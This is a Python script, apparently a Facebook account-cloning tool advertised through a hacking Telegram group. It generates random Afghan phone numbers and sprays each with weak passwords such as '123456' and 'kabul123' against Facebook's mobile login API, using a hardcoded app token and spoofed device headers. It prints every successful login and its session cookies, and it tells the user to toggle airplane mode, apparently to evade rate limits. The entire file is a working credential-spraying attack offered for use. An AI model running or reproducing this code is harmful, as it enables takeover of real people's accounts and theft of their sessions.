import os, time, random, string, sys, uuid, json
from concurrent.futures import ThreadPoolExecutor

import requests

numbs = []
loop = 0
ok_ids = []
cp_ids = []

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
Y = '\033[33m'

logo = f'''{G}
  ███████╗░█████╗░██╗░░░██╗███████╗░██████╗░
  ██╔════╝██╔══██╗╚██╗░██╔╝██╔════╝██╔═══██╗
  █████╗░░███████║░╚████╔╝░█████╗░░██║██╗██║
  ██╔══╝░░██╔══██║░░╚██╔╝░░██╔══╝░░╚██████╔╝
  ██║░░░░░██║░░██║░░░██║░░░███████╗░╚═██╔═╝░
  ╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░░░╚═╝░░░
{R}|------------------------------------------------|
[●]{C}Tooles manufacturer | FayeqNaseh
[●]{R}Telegram group      | @AFGHAN_HACK
[●]{Y}Status              | Gold
[●]{G}Version             | 0.1
'''

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(logo)

def line():
    print(f' |---------------------------------------------')

def FAYEQ():
    clear()
    line()
    print(f' | [1] Random Cloning')
    print(f' | [2] Contact Admin')
    print(f' | [3] Exit Program')
    line()
    inp = str(input(' | Choose : ')).strip()
    if inp in ['1', '01']:
        randomClone()
    elif inp in ['2', '02']:
        os.system('xdg-open https://t.me/AFGHAN_HACK')
    elif inp in ['3', '03']:
        print(' | Have a nice day')
        exit()
    else:
        print(' | Option not found in menu')
        time.sleep(2)
        FAYEQ()

def randomClone():
    clear()
    line()
    print(' | Codes for afg : 078, 079, 074, 072, 070')
    print(' | Codes for worldwide : 9378, 9379, 9374, 9372')
    line()
    inp = str(input(' | Choose Code : '))
    try:
        limit = int(input(' | Put Limit : '))
    except:
        limit = 5000
    unique_numbers = set()
    while len(unique_numbers) < limit:
        numb = ''.join(random.choice(string.digits) for _ in range(7))
        unique_numbers.add(numb)
    
    with ThreadPoolExecutor(max_workers=10) as FAYEQ_executor:
        clear()
        line()
        print(' | Method : Random Cloning')
        print(f' | Limit : {len(unique_numbers)}')
        print(' | ON/OF Airplane mode before use')
        line()
        for number in unique_numbers:
            ids = inp + number
            passwords = [number, ids, '123456', '12345678', 'afghanistan', 'afg123', 'Afghanistan', 'afghan123', 'kabul123']
            FAYEQ_executor.submit(startClone, ids, passwords)

def startClone(ids, passwords):
    global loop
    sys.stdout.write(f'\r | [FAYEQ-CLONE] {loop}/{len(ok_ids)}/{len(cp_ids)}')
    sys.stdout.flush()
    
    for pas in passwords:
        try:
            useragent ="Mozilla/6.0 (Linux; Android 11: K)","Mozilla/7.0 (Linux; Android 12: K)","Mozilla/5.0 (Linux; Android 9: K)"

            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate'
            }
            header = {
                'User-Agent': useragent,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/method/auth.login'
            response = requests.post(url, data=data, headers=header).text
            data_response = json.loads(response)
            
            if 'session_key' in data_response:
                print(f'\r | [FAYEQ-OK] {ids} | {pas}')
                cookie = ";".join(f"{c['name']}={c['value']}" for c in data_response.get('session_cookies', []))
                print(f'\r | [COOKIE] : {cookie}')
                ok_ids.append(ids)
                break
        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception as error:
            print(f"\n | [ERROR] {error}")
    
    loop += 1

FAYEQ()
